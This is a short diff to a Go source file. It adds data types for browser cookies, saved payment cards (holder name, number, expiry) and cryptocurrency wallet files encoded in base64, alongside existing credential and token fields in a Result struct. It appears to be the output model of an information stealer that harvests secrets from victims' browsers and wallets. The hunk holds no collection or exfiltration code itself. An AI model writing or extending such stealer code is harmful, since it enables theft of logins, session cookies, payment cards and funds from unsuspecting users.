@@ -10,9 +10,37 @@ type Credential struct {
 	Password string `json:"password"`
 }
 
+type Cookie struct {
+	Browser  string `json:"browser"`
+	Profile  string `json:"profile"`
+	Host     string `json:"host"`
+	Name     string `json:"name"`
+	Value    string `json:"value"`
+	Path     string `json:"path"`
+	IsSecure bool   `json:"isSecure"`
+}
+
+type Card struct {
+	Browser     string `json:"browser"`
+	Profile     string `json:"profile"`
+	Name        string `json:"name"`
+	Number      string `json:"number"`
+	ExpiryMonth int    `json:"expiryMonth"`
+	ExpiryYear  int    `json:"expiryYear"`
+}
+
+type WalletFile struct {
+	Wallet   string `json:"wallet"`
+	Filename string `json:"filename"`
+	DataB64  string `json:"dataB64"`
+}
+
 type Result struct {
 	Credentials []Credential `json:"credentials"`
+	Cookies     []Cookie     `json:"cookies"`
+	Cards       []Card       `json:"cards"`
 	Tokens      []string     `json:"tokens"`
+	Wallets     []WalletFile `json:"wallets"`
 	Errors      []string     `json:"errors"`
 }
 
